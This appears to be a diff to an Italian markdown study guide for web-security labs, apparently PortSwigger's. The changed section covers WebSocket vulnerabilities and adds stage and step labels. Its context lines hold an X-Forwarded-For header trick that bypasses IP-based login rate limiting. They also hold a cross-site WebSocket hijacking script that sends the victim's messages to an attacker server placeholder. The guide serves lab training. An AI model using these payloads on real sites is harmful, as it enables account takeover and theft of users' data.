@@ -1393,7 +1393,7 @@ Non presenti nel repository di riferimento botesjuan (o non mappabili a un singo
 - Step: 2
 
 
-## WebSockets
+## WebSockets — Stage tipico: 1-2
 
 **Come riconoscerla (generale):** apri Burp Proxy > WebSockets history mentre usi la funzionalità dell'app; intercetta/modifica i messaggi WS con Burp Proxy/Repeater; qualsiasi vulnerabilità HTTP classica (XSS, SQLi, ecc.) può presentarsi anche nei messaggi WS, e l'handshake stesso (fatto via HTTP) può essere vulnerabile a CSRF se si basa solo sui cookie.
 
@@ -1403,6 +1403,7 @@ Non presenti nel repository di riferimento botesjuan (o non mappabili a un singo
 - Soluzione: clonare/modificare l'handshake WebSocket in Burp Repeater (icona matita vicino all'URL WS) aggiungendo o alterando header custom per sfruttare la logica difettosa lato server (es. bypassare rate-limiting su un endpoint di login esposto via WS).
 - Payload: aggiungere all'handshake un header come `X-Forwarded-For: 1.1.1.<random>` per ogni tentativo, bypassando il blocco basato su IP
 - Link: [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
+- Step: 1
 
 **2. Cross-site WebSocket hijacking (CSWSH)**
 
@@ -1410,6 +1411,7 @@ Non presenti nel repository di riferimento botesjuan (o non mappabili a un singo
 - Soluzione: creare una pagina HTML malevola ospitata sul proprio dominio che, al caricamento, apre una connessione WebSocket cross-site verso l'app vulnerabile (il browser della vittima invierà automaticamente i cookie di sessione); la pagina può poi inviare messaggi per eseguire azioni o intercettare messaggi di risposta contenenti dati sensibili.
 - Payload: pagina HTML con script `<script>var ws = new WebSocket('wss://TARGET/chat'); ws.onmessage = function(event) { fetch('https://TUO-SERVER/log?data=' + event.data); }; ws.onopen = function() { ws.send('READY'); };</script>`
 - Link: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
+- Step: 2
 
 
 ## Business logic vulnerabilities
